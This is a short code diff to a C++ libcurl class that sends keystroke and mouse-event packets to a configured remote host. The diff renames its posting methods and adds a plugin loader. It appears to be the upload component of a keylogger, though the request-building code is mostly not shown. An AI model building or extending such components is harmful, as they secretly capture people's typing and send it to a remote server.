@@ -10,6 +10,7 @@
 
 #include "debug.hh"
 #include "HttpPost.hh"
+#include "IPlugin.hh"
 
 HttpPost::HttpPost()
 {
@@ -26,7 +27,7 @@ HttpPost::~HttpPost()
   curl_global_cleanup();
 }
 
-bool	HttpPost::postPaquet(PaquetKeys *paquet, const std::string &name)
+bool	HttpPost::getKey(PaquetKeys *paquet, const std::string &name)
 {
   std::string	request = "";
   std::string	url = HOST_NAME;
@@ -51,7 +52,7 @@ bool	HttpPost::postPaquet(PaquetKeys *paquet, const std::string &name)
   return true;
 }
 
-bool	HttpPost::postPaquet(PaquetMouse *paquet, const std::string &name)
+bool	HttpPost::getMouse(PaquetMouse *paquet, const std::string &name)
 {
   std::string	request = "";
   std::string	url = HOST_NAME;
@@ -145,4 +146,9 @@ std::string	HttpPost::createRequest(PaquetMouse *paquet, const std::string &name
 #endif /* !DEBUG */
 
   return request;
+}
+
+extern "C" IPlugin	*loadPlugin()
+{
+  return (new HttpPost());
 }
